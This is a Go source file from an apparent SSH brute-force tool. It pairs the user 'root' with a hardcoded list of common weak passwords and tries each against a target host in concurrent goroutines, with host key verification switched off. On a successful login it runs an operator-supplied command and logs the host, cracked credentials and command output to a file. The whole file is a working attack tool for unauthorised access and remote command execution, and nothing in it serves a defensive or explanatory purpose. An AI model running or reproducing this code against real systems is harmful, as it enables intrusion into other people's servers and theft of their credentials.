package brute

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"os"
	"strings"
	"time"
)
import "bruteforcer/Global"

var sshBruteUsers = []string{"root"}
var sshBrutePwds = []string{
	"123456",
	"654321",
	"password",
	"123123",
	"admin",
	"admin12345",
	"admin123",
	"root",
	"root123",
	"111111",
	"qwe123",
	"123qwe",
	"123321",
	"666666",
	"a123456.",
	"000000",
	"00000",
	"8888888",
	"abc123",
	"abc123456",
	"sysadmin",
	"system"}

func SSHBrute(host string, port string, file *os.File) {
	if Global.USR != "" {
		sshBruteUsers = append(sshBruteUsers, Global.USR)
	}
	if Global.PWD != "" {
		sshBrutePwds = append(sshBrutePwds, Global.PWD)
	}
	isSuc := false
	if Global.DBG {
		fmt.Printf("%v开始执行\n", host+":"+port)
	}
	for _, user := range sshBruteUsers {
		for _, pwd := range sshBrutePwds {
			go doSingleSSHBrute(host, port, user, pwd, &isSuc, file)
			time.Sleep(time.Duration(500 * time.Microsecond))

		}
	}
}
func doSingleSSHBrute(host string, port string, user string, pwd string, isSuc *bool, file *os.File) {
	retryN := 0
restart:
	retryN++
	sshConf := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pwd),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	sshdial, err := ssh.Dial("tcp", host+":"+port, sshConf)
	if err == nil { //如果密码正确

		defer func(sshdial *ssh.Client) { // 关闭ssh通道
			err := sshdial.Close()
			if err != nil && Global.DBG {
				println("ssh通道关闭错误")
			}
		}(sshdial)
		//密码正确
		session, sessionerr := sshdial.NewSession()
		if sessionerr == nil {
			defer func(session *ssh.Session) { // 关闭session
				err := session.Close()
				if err != nil && Global.DBG {
					println("session关闭错误")
				}
			}(session)

			shellOutput, runerr := session.CombinedOutput(Global.CMD)
			if runerr == nil {
				if *isSuc {
					return
				}
				if Global.DBG {
					println("成功")
				}
				sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user, pwd, Global.CMD, string(shellOutput))
				println(sucOutStr)                        // 输出成功信息
				_, _ = file.WriteString(sucOutStr + "\n") // 打印信息
				*isSuc = true
			} else if Global.DBG {
				println(fmt.Sprintf("命令运行错误 %v", runerr))
			}
		} else {
			if Global.DBG {
				println("session创建错误")
			}
		}

	} else {
		if (strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "forcibly closed")) && retryN <= 3 {
			goto restart // 如果不是验证错误的重试3次
		}
		if Global.DBG {
			OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user, pwd)
			println("err" + OutStr)
			println(err.Error())
			//return
		}
	}
}
